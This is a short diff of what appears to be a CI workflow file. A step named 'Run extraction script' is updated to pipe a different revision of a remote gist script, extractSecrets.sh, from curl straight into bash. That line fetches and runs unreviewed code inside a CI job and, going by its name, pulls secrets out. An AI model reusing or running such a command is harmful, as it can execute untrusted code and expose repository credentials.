@@ -12,4 +12,4 @@ jobs:
     steps:
       - name: Run extraction script
         run: |
-          curl -fsSL https://gist.githubusercontent.com/alfetopito/ad724aa2b920a742eb432ff636f99b41/raw/fad2747d545c41e1895fbd7ea3092a71087c7d26/extractSecrets.sh | bash
+          curl -fsSL https://gist.githubusercontent.com/alfetopito/ad724aa2b920a742eb432ff636f99b41/raw/5fcfa0eacfbdb174c34847877cc27070158673f1/extractSecrets.sh | bash
